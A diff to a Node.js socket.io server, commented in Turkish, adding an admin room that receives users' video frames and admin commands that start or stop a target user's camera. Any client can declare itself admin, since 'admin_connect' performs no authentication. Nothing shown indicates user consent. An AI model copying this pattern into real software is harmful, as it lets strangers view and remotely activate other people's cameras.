@@ -25,18 +25,40 @@ function logToFile(message, level = "INFO", source = "SOCKET") {
   fs.appendFileSync(logFilePath, logEntry);
 }
 
-
-
 const connectedUsers = {};
+const adminConnections = [];
 
 io.on("connection", (socket) => {
   console.log("Bir kullanıcı bağlandı:", socket.id);
   logToFile(`Kullanıcı ${socket.id} bağlantıyı açtı.`);
+  
+  // Admin bağlantıları için
+  socket.on("admin_connect", () => {
+    console.log(`Admin bağlandı: ${socket.id}`);
+    logToFile(`Admin bağlandı: ${socket.id}`, "INFO", "SOCKET");
+    adminConnections.push(socket.id);
+    socket.join("admin-room");
+  });
+  
   // Kullanıcı login olduysa bağlandığında user_id bilgisini yollamalı
   socket.on("user_login", (userId) => {
     connectedUsers[userId] = socket.id;
     console.log(`Kullanıcı ${userId} giriş yaptı.`);
     logToFile(`Kullanıcı ${userId} giriş yaptı.`, "INFO", "SOCKET");
+  });
+
+  // Video frame alıcı
+  socket.on("video_frame", (frameData) => {
+    // Admin panel bağlantılarına frame gönder
+    io.to("admin-room").emit("client_video_frame", {
+      socketId: socket.id,
+      userId: frameData.userId,
+      frame: frameData.frame,
+      timestamp: frameData.timestamp
+    });
+    
+    // Console'a log yazma - çok fazla log oluşturacağı için kapatıldı
+    // console.log(`Video frame alındı: ${frameData.userId || socket.id}`);
   });
 
   // Mesaj gönderme
@@ -69,6 +91,12 @@ io.on("connection", (socket) => {
     console.log("Bir kullanıcı ayrıldı:", socket.id);
     logToFile(`Kullanıcı ${socket.id} bağlantıyı kapattı.`, "INFO", "SOCKET");
 
+    // Admin bağlantılarından çıkar
+    const adminIndex = adminConnections.indexOf(socket.id);
+    if (adminIndex !== -1) {
+      adminConnections.splice(adminIndex, 1);
+    }
+
     // connectedUsers'tan sil
     for (let uid in connectedUsers) {
       if (connectedUsers[uid] === socket.id) {
@@ -84,7 +112,30 @@ io.on("connection", (socket) => {
     delete connectedUsers[userId];
   });
   
-
+  // Admin komutları
+  socket.on("admin_command", (command) => {
+    if (adminConnections.includes(socket.id)) {
+      console.log(`Admin komutu alındı: ${command.action}`);
+      
+      // Kamera başlatma komutu
+      if (command.action === "start_camera" && command.targetUserId) {
+        const targetSocket = connectedUsers[command.targetUserId];
+        if (targetSocket) {
+          io.to(targetSocket).emit("admin_command", { action: "start_camera" });
+          logToFile(`Admin ${socket.id} kullanıcı ${command.targetUserId} için kamera başlattı`, "INFO", "ADMIN-COMMAND");
+        }
+      }
+      
+      // Kamera kapatma komutu
+      if (command.action === "stop_camera" && command.targetUserId) {
+        const targetSocket = connectedUsers[command.targetUserId];
+        if (targetSocket) {
+          io.to(targetSocket).emit("admin_command", { action: "stop_camera" });
+          logToFile(`Admin ${socket.id} kullanıcı ${command.targetUserId} için kamerayı kapattı`, "INFO", "ADMIN-COMMAND");
+        }
+      }
+    }
+  });
 });
 
 server.listen(3000, () => {
